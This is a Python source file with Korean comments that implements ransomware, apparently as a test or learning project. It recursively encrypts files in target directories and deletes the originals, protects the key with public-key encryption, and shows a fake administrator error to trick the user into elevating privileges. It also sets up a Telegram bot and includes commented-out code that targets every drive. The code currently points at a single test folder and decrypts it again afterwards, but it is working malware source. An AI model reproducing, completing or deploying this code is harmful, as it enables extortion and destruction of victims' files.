import ctypes
import threading, pathlib, nacl.utils, tkinter
import os, sys, nacl.secret
from PIL import Image, ImageDraw, ImageFont
from time import sleep
from tkinter import messagebox
from datetime import datetime#https://pynacl.readthedocs.io/en/latest/public/
from nacl.public import PrivateKey, Box
import telegram, asyncio

    #1. 암호화와 복호화를 수행할 클래스. 파일명을 리스트로 받고, 암호화 복호화 모듈로 nacl.secretbox.SecretBox()인터페이스를 받는다.
class EnDecryptor:
    def __init__(self, files=0, encryptModule=0):
        self._files=files
        self._encryptModule=encryptModule

    def encryptFile(self):
        try:
            for file in self._files:
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return

                    with open(file, "rb") as File:
                        data=File.read()
                    encryptedFile=self._encryptModule.encrypt(data)
                    with open(f"{file}.LoL", "wb") as File:
                        File.write(encryptedFile)
                    os.remove(file)
                
        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")

    def decryptFile(self):
        try:
            for file in self._files:
                originName=file.strip(".LoL")
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return

                    with open(file, "rb") as File:
                        data=File.read()
                    decryptedFile=self._encryptModule.decrypt(data)
                    with open(originName, "wb") as File:
                        File.write(decryptedFile)
                    os.remove(file)
                
        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.decryptFile(): {e}")

    #2. AES기반 키 생성. 스크립트 실행 시 키를 인자로 받으면 복호화모드, 키가 없으면 암호화모드로 랜덤 키값 생성
if len(sys.argv)==1:
    print("[DEBUG] 키를 랜덤하게 생성합니다")
    Key=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
elif len(sys.argv)==2:
    with open(sys.argv[1], 'rb') as File:
        Key=File.read()

    #3. AES기반 암호화 모듈 생성(위의 키값 이용)
EncryptModule=nacl.secret.SecretBox(Key)

    #4. RSA기반 Server와 Client의 개인 및 공개키 정보 저장 클래스
class Server:
    def __init__(self, privateKey, targetPublicKey):
        self._privateKey=privateKey
        self._publicKey=self._privateKey.public_key
        self._box=Box(self._privateKey, targetPublicKey)

    def encrypt(self, AESkey):
        return self._box.encrypt(AESkey)

    def decrypt(self, encryptedAESkey):
        return self._box.decrypt(encryptedAESkey)

class Client(Server):
    pass

    #6. Server와 Client의 개인 키 생성 및 객체 인스스턴화
serverPrivateKey=PrivateKey.generate()
clientPrivateKey=PrivateKey.generate()
server=Server(serverPrivateKey, clientPrivateKey.public_key)
client=Client(clientPrivateKey, serverPrivateKey.public_key)


    #7. 기본 환경설정
MaxThread=120
IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()
BOT=telegram.Bot(token='')#보안
CHAT_ID=0#보안

async def sendTelegram(chat_id, msg):
    await BOT.send_message(chat_id, msg)

    #8. 암호화 타겟 드라이브 리스트화
#PathList=[r"C:\Users\\"]
#for letter in range(97, 123):
#    drive=f"{chr(letter)}:\\"
#    if (pathlib.Path(drive).exists()):
#        PathList.append(drive)
#PathList.remove("c:\\")
#print(f"[DEBUG] PathList: {PathList}")
PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\test"]#테스트용 타겟 경로


#==================내부 함수=================
    #암호화 시작 전, 랜섬웨어에 감염됐다는 메시지를 전달한다.
def changeBackground():
    print("[DEBUG] 당신의 컴퓨터는 랜섬웨어에 결렸습니다. 같은 경고메시지 출력")

    #디렉토리별로 재귀적으로 암호화 메서드를 호출한다.
def recursiveEncrypt(basepath):
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        EnDecryptor(files, EncryptModule).encryptFile()
    for dir in dirs:
        recursiveEncrypt(dir)

    #디렉토리별로 재귀적으로 복호화 메서드를 호출한다.
def recursiveDecrypt(basepath):
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        EnDecryptor(files, EncryptModule).decryptFile()
    for dir in dirs:
        recursiveDecrypt(dir)

    #Admin계정으로의 접근을 유도한다
def fakeAlert():
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Error", "Try to re-run as administrator")

    #AES키를 RSA방식으로 암호화한다.
def encryptKey(AESkey):
    return client.encrypt(AESkey)

    #AES키를 RSA방식으로 복호화한다.
def decryptKey(AESkey):
    return server.decrypt(AESkey)#사실 client로도 될 듯 하네만.. 그럼 AES와 다를 바가 없으니 decrypt는 server관점에서 수행

    #Key를 Binary모드로 저장한다. 저장하는 키의 이름은 프로그램 실행 시점의 시각정보를 포함한다.
keyfilename=f"key_{datetime.now().strftime('%Y-%m-%d %H-%M-%S')}"
def saveKey():
    print("[DEBUG] AES키 RSA암호화를 진행합니다.")
    encryptedAESKey=encryptKey(Key)#RSA암호화 진행
    with open(keyfilename, "wb") as File:
        File.write(encryptedAESKey)
    print("[DEBUG] AES키 RSA암호화가 완료되었습니다.")

def getKey():
    print("[DEBUG] AES키 RSA복호화를 진행합니다.")
    if os.path.isfile(keyfilename):
        with open(keyfilename, "rb") as File:
            encryptedAESKey=File.read()
            decryptedAESKey=decryptKey(encryptedAESKey)#RSA복호화 진행
            Key=decryptedAESKey#복호화 키값 로드
    else:
        print("[DEBUG] 올바른 키 경로가 아닙니다")
    print("[DEBUG] AES키 RSA복호화가 완료되었습니다.")
    

    #실제 암호화를 실행한다.
if __name__ == '__main__':
    #print("전송시도")
    #asyncio.run(sendTelegram(CHAT_ID, "테스트전송메시지"))
    #print("전송")
    #sleep(100)
    print("[DEBUG] admin여부", IsAdmin)
    saveKey()#RSA사용하여 키를 암호화하여 저장
    getKey()#RSA사용하여 키를 복호화하여 로드
    if(IsAdmin==False):#디버그를 위한 강제실행
        changeBackground()
        for drive in PathList_DEBUG:
            print("\n[DEBUG] ==============================================================================")
            print("[DEBUG] 암호화가 10초 뒤 진행될 예정입니다. 타겟디렉토리를 마지막으로 확인하세요: ", drive)
            print("[DEBUG] ==============================================================================\n")
            sleep(10)
            recursiveEncrypt(drive)#암호화 수행
            print("[DEBUG] 암호화 완료. 30초 뒤 복호화를 수행합니다")
            sleep(30)
            recursiveDecrypt(drive)#복호화 수행
            print("[DEBUG] 복호화 완료")
            
    else:
        fakeAlert()
            
                          
                      
